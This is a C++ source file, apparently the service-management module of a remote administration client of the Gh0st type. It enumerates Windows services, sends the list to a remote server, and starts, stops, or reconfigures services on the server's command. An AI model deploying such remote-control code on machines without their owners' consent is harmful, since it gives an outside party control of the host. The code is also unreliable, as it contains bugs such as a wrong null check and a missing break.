#include "ClientServiceManager.h"

CClientServiceManager::CClientServiceManager(_CIOCPClient* ClientObject) :CManager(ClientObject)
{
	printf("CServiceManager()构造成功\r\n");
	m_ServiceManagerHandle = NULL;
	EnableSeDebugPrivilege("SeShutdownPrivilege", TRUE);
	SendClientServiceList();
}

CClientServiceManager::~CClientServiceManager()
{
	printf("~CServiceManager()析构成功\r\n");
	if (m_ServiceManagerHandle != NULL)
	{
		CloseServiceHandle(m_ServiceManagerHandle);
		m_ServiceManagerHandle = NULL;
	}
	EnableSeDebugPrivilege("SeShutdownPrivilege", FALSE);
}


LPBYTE CClientServiceManager::GetClientServiceList()
{
	LPENUM_SERVICE_STATUS  EnumServiceStatus = NULL;
	LPQUERY_SERVICE_CONFIG v1 = NULL;
	DWORD    ReturnLength = 0;
	DWORD    ServicesReturned = 0;
	DWORD    ResumeHandle = 0;
	LPBYTE	 BufferData = NULL;
	DWORD	 Offset = 0;

	char	 RunWay[256] = { 0 };
	char	 AutoRun[256] = { 0 };
	DWORD	 BufferLength = 0;

	//打开服务管理器获得句柄
	if ((m_ServiceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL)
	{
		return NULL;
	}

	EnumServiceStatus = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, 64 * 1024);
	if (EnumServiceStatus == NULL)
	{
		CloseServiceHandle(m_ServiceManagerHandle);
		m_ServiceManagerHandle = NULL;
		return NULL;
	}
	//通过句柄枚举信息
	EnumServicesStatus(m_ServiceManagerHandle,
		SERVICE_TYPE_ALL,    //CTL_FIX
		SERVICE_STATE_ALL,
		(LPENUM_SERVICE_STATUS)EnumServiceStatus,
		64 * 1024,
		&ReturnLength,
		&ServicesReturned,
		&ResumeHandle);
	BufferData = (LPBYTE)LocalAlloc(LPTR, MAX_PATH);

	BufferData[0] = CLIENT_SERVICE_MANAGER_REPLY;
	Offset = 1;
	for (unsigned long i = 0; i < ServicesReturned; i++)  // Display The Services,显示所有的服务
	{
		SC_HANDLE ServiceHandle = NULL;
		DWORD     ResumeHandle = 0;

		ServiceHandle = OpenService(m_ServiceManagerHandle, EnumServiceStatus[i].lpServiceName,
			SERVICE_ALL_ACCESS);
		if (ServiceHandle == NULL)
		{
			continue;
		}
		v1 = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, 4 * 1024);
		QueryServiceConfig(ServiceHandle, v1, 4 * 1024, &ResumeHandle);
		//查询服务的启动类别
		if (EnumServiceStatus[i].ServiceStatus.dwCurrentState != SERVICE_STOPPED) //启动状态
		{
			ZeroMemory(RunWay, sizeof(RunWay));
			lstrcat(RunWay, "启动");
		}
		else
		{
			ZeroMemory(RunWay, sizeof(RunWay));
			lstrcat(RunWay, "停止");
		}

		if (2 == v1->dwStartType)   //启动类别  //SERVICE_AUTO_START
		{
			ZeroMemory(AutoRun, sizeof(AutoRun));
			lstrcat(AutoRun, "自动");
		}
		if (3 == v1->dwStartType)   //SERVICE_DEMAND_START
		{
			ZeroMemory(AutoRun, sizeof(AutoRun));
			lstrcat(AutoRun, "手动");
		}
		if (4 == v1->dwStartType)
		{
			ZeroMemory(AutoRun, sizeof(AutoRun));   //SERVICE_DISABLED
			lstrcat(AutoRun, "禁用");
		}

		//计算数据包的大小
		BufferLength = sizeof(DWORD) + lstrlen(EnumServiceStatus[i].lpDisplayName)
			+ lstrlen(v1->lpBinaryPathName) + lstrlen(EnumServiceStatus[i].lpServiceName)
			+ lstrlen(RunWay) + lstrlen(AutoRun) + 1;
		//缓冲区太小，再重新分配下
		if (LocalSize(BufferData) < (Offset + BufferLength))
			BufferData = (LPBYTE)LocalReAlloc(BufferData, (Offset + BufferLength),
				LMEM_ZEROINIT | LMEM_MOVEABLE);

		memcpy(BufferData + Offset, EnumServiceStatus[i].lpDisplayName,
			lstrlen(EnumServiceStatus[i].lpDisplayName) + 1);
		Offset += lstrlen(EnumServiceStatus[i].lpDisplayName) + 1;//真实名称

		memcpy(BufferData + Offset, EnumServiceStatus[i].lpServiceName, lstrlen(EnumServiceStatus[i].lpServiceName) + 1);
		Offset += lstrlen(EnumServiceStatus[i].lpServiceName) + 1;//显示名称

		memcpy(BufferData + Offset, v1->lpBinaryPathName, lstrlen(v1->lpBinaryPathName) + 1);
		Offset += lstrlen(v1->lpBinaryPathName) + 1;//路径

		memcpy(BufferData + Offset, RunWay, lstrlen(RunWay) + 1);//运行状态
		Offset += lstrlen(RunWay) + 1;

		memcpy(BufferData + Offset, AutoRun, lstrlen(AutoRun) + 1);//自启动状态
		Offset += lstrlen(AutoRun) + 1;

		CloseServiceHandle(ServiceHandle);
		LocalFree(v1);  //Config
	}
	CloseServiceHandle(m_ServiceManagerHandle);
	LocalFree(EnumServiceStatus);
	return BufferData;
}

void CClientServiceManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
		//服务端管理请求
	case CLIENT_SERVICE_MANAGER_REQUIRE:
	{
		SendClientServiceList();
		break;
	}
	// 服务端配置服务请求
	case CLIENT_SERVICE_CONFIG_REQUIRE:
	{

		ConfigClientService((LPBYTE)BufferData + 1, BufferLength - 1);
		break;
	}
	}
}


VOID CClientServiceManager::SendClientServiceList()
{
	LPBYTE	BufferData = GetClientServiceList();
	if (BufferData == NULL)
	{
		return;
	}
	m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData)); // 向服务端发送消息
	LocalFree(BufferData);
}



void CClientServiceManager::ConfigClientService(PBYTE BufferData, ULONG BufferLength) 
{
	BYTE IsMethod = BufferData[0];
	char* ServiceName = (char*)(BufferData + 1);

	switch (IsMethod)
	{
	case 1:
	{
		SC_HANDLE ServiceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (NULL != ServiceManagerHandle)
		{
			SC_HANDLE ServiceHandle = OpenService(ServiceManagerHandle,
				ServiceName, SERVICE_ALL_ACCESS);
			if (NULL != ServiceHandle)
			{
				StartService(ServiceHandle, NULL, NULL);
				CloseServiceHandle(ServiceHandle);
			}
			CloseServiceHandle(ServiceManagerHandle);
		}
		Sleep(500);
		SendClientServiceList();
	}
	break;

	case 2:
	{
		SC_HANDLE ServiceManagerHandle =
			OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);  //SC_MANAGER_CREATE_SERVICE
		if (NULL != ServiceManagerHandle)
		{
			SC_HANDLE ServiceHandle = OpenService(ServiceManagerHandle,
				ServiceName, SERVICE_ALL_ACCESS);
			if (NULL != ServiceHandle)
			{
				SERVICE_STATUS Status;
				BOOL IsOk = ControlService(ServiceHandle, SERVICE_CONTROL_STOP, &Status);
				CloseServiceHandle(ServiceHandle);
			}
			CloseServiceHandle(ServiceManagerHandle);
		}
		Sleep(500);
		SendClientServiceList();
	}
	break;
	case 3:	//auto
	{
		SC_HANDLE ServiceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (NULL != ServiceManagerHandle)
		{
			SC_HANDLE ServiceHandle = OpenService(ServiceManagerHandle, ServiceName,
				SERVICE_ALL_ACCESS);
			if (NULL != ServiceHandle)
			{
				SC_LOCK v1 = LockServiceDatabase(ServiceManagerHandle);
				BOOL IsOk = ChangeServiceConfig(
					ServiceHandle,
					SERVICE_NO_CHANGE,
					SERVICE_AUTO_START,
					SERVICE_NO_CHANGE,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL);
				UnlockServiceDatabase(v1);
				CloseServiceHandle(ServiceHandle);
			}
			CloseServiceHandle(ServiceManagerHandle);
		}
		Sleep(500);
		SendClientServiceList();
	}
	break;
	case 4: // DEMAND_START
	{
		SC_HANDLE ServiceManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
		if (NULL != ServiceManagerHandle)
		{
			SC_HANDLE ServiceHandle = OpenService(ServiceManagerHandle, ServiceName, SERVICE_ALL_ACCESS);
			if (NULL != ServiceName)
			{
				SC_LOCK v1 = LockServiceDatabase(ServiceManagerHandle);
				BOOL IsOK = ChangeServiceConfig(
					ServiceHandle,
					SERVICE_NO_CHANGE,
					SERVICE_DEMAND_START,
					SERVICE_NO_CHANGE,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL);
				UnlockServiceDatabase(v1);
				CloseServiceHandle(ServiceHandle);
			}
			CloseServiceHandle(ServiceManagerHandle);
		}
		Sleep(500);
		SendClientServiceList();
	}
defaute:
	break;
	}
}


